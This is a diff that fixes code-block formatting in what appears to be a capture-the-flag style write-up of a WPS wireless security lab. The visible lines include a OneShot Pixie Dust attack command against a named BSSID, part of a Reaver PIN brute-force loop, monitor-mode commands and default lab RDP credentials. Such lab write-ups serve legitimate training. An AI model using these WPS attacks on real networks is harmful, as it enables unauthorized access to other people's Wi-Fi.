@@ -75,8 +75,8 @@ In this module, we examine wireless security auditing targeting WPS. We inspect 
 
 ```bash
 xfreerdp /v:<Target IP> /u:<username> /p:<password>
-```
 /dynamic-resolution
+```
 
 this operation will be referred throughout the writeup as 'RDP login'.
 the default credentials are 'wifi:wifi', unless specified otherwise.
@@ -143,7 +143,7 @@ result BSSID has the mentioned value:
 
 > **Lab Question (Page 4)**: What is the WPA PSK for the WIFI Network named HackTheWifi?
 >
-> **Flag / Answer**: ``
+> **Flag / Answer**: 
 {: .prompt-info }
 
 #### Technical Methodology & Exploit Execution:
@@ -432,8 +432,8 @@ if echo "$OUTPUT" | grep -q "PSK"; then
 echo "PIN and PSK found"
 echo "PIN: $PIN"
 echo "Reaver Output: $OUTPUT"
-```
 break
+```
 fi
 done
 
@@ -556,8 +556,8 @@ And run on it the following command, using the Pixie Dust attack tool
 'OneShot':
 ```bash
 sudo python3 /opt/OneShot/oneshot.py -b 12:7D:76:D9:E6:61 -i
-```
 wlan0mon -K
+```
 
 
 *
@@ -614,8 +614,8 @@ Now, we will stop the monitoring using the commands:
 ```bash
 sudo iw wlan0mon del;
 sudo airmon-ng stop wlan0mon;
-```
 enter 'y' on prompt:
+```
 
 
 Now that the monitoring is off – we proceed to connect to 'HackTheWireless'
